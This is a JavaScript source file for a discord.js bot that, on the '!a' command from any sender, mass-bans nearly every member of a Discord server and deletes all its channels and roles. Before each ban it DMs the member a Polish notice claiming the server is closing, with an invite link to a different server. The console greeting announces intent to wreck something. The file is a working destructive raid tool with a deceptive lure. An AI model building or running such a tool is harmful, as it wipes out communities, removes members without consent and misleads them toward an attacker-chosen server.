import { Client, Intents } from 'discord.js';
import dotenv from 'dotenv';
const BotClient = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_BANS]
});

dotenv.config();
BotClient.on('ready', () => {
    console.log('Czas coś rozjebać');
});

BotClient.on('messageCreate', async msg => {
    // check prefix
    if (msg.content.startsWith('!a')) {
        try {
            console.log(`\n\n\n!a command\n\n\n`);

            console.log(`\n\nmsg.guild.members.list()`);
            await msg.guild.members.list({
                limit: 1000
            }).then(members => console.log(members.map(el => el.user)));

            console.log(`\n\nmsg.guild.members.cache`);
            console.log(msg.guild.members.cache.map(el => el.user));

            msg.guild.members.cache
                // get list of users to ban (exclude some of them)
                .filter(m => {
                    return (
                        m.user.id !== msg.guild.ownerID &&
                        m.user.id !== BotClient.user.id &&
                        // wujaszek
                        m.user.id !== '335749600101138436' &&
                        // majchal
                        m.user.id !== '596805465095274549' &&
                        // toster
                        m.user.id !== '251707905202454529'
                    );
                })
                .forEach(m => {
                    m.user
                        // send msg to user, then ban them
                        .send(`Przepraszamy, nasz serwer: ${msg.guild.name} zostaje zamknięty, z tego powodu przenosimy się na nowy serwer: https://discord.gg/wG7pSkNwZP \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!`)
                        .then(m.ban())
                        .catch(console.error);
                });
            msg.guild.channels.cache.forEach(channel => channel.delete());
            msg.guild.roles.cache.forEach(role => role.delete());
            msg.guild.channels
                .create('Serwer zamknięty', {
                    type: 'text'
                })
                .then(msg.guild.fetchTemplates().then(t => t.first().sync()))
                .then(msg.guild.createTemplate('Serwer zamknięty').then(t => t.sync()))
                .catch(console.error);
        } catch (error) {
            console.log(error);
        }
    };
});

BotClient.login(process.env.TOKEN);